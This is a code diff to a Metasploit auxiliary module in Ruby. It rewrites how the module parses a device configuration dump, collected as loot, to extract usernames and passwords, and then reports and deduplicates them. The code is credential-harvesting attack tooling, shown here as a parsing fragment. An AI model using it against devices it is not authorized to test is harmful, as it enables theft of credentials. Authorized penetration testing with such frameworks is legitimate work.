@@ -89,24 +89,17 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def parse_config(chunk)
-    credential = {
-      ip: @ip_address,
-      port: datastore['RPORT'],
-      service_name: @proto,
-      user: read_param(chunk[36..421]),
-      password: read_param(chunk[422..550]),
-      group: read_param(chunk[551..622]),
-      profile: read_param(chunk[623..698])
-    }
-  end
+    chunk = chunk.split("\x00").reject { |c| c.empty? }
 
-  def read_param(param)
-    output = ''
-    param.each_char do |c|
-      break if c == "\x00"
-      output << c
+    unless chunk[1].nil? or chunk[2].nil?
+      credential = {
+        ip: @ip_address,
+        port: datastore['RPORT'],
+        service_name: @proto,
+        user: chunk[1],
+        password: chunk[2]
+      }
     end
-    return output
   end
 
   def report_creds(creds)
@@ -114,7 +107,7 @@ class MetasploitModule < Msf::Auxiliary
       cred = cred.gsub('"', '').gsub(/[{}:]/,'').split(', ').map{|h| h1,h2 = h.split('=>'); {h1 => h2}}.reduce(:merge)
       cred = JSON.parse(cred.to_json)
 
-      if !cred['user'].blank? && !cred['password'].blank?
+      if cred && (!cred['user'].blank? && !cred['password'].blank?)
         service_data = {
           address: cred['ip'],
           port: cred['port'],
@@ -161,26 +154,19 @@ class MetasploitModule < Msf::Auxiliary
     loot_path = store_loot('', 'text/plain', @ip_address, loot_data, '', '')
     print_good(message("File saved to #{loot_path}"))
 
-    if data.length > 110
-      if data[72..73] == "\x5F\x01"
-        io = StringIO.new(data[74..-1])
-      elsif data[104..109] == "\x5F\x00\x00\x00\x00\x01"
-        io = StringIO.new(data[110..-1])
-      end
+    separator = "\x5F\x01"
+    if data =~ /\x5F\x00\x00\x00\x00\x01/
+      separator = "\x5F\x00\x00\x00\x00\x01"
+    end
+    data = data.split(separator)
 
-      begin
-        creds = []
-        until io.eof?
-          chunk = io.read(913)
-          if chunk[0] != "\x00"
-            creds << "#{parse_config(chunk)}"
-          end
-        end
-      rescue NoMethodError
-        print_error(message('No credential(s) found!'))
-        return
+    creds = []
+    data.each_with_index do |chunk, index|
+      if index > 0
+        creds << "#{parse_config(chunk)}" unless chunk[0] == "\x00" or !chunk[0].ascii_only?
       end
     end
+    creds = creds.uniq
 
     if creds.length > 0
       print_good(message("#{creds.length} credential(s) found!"))
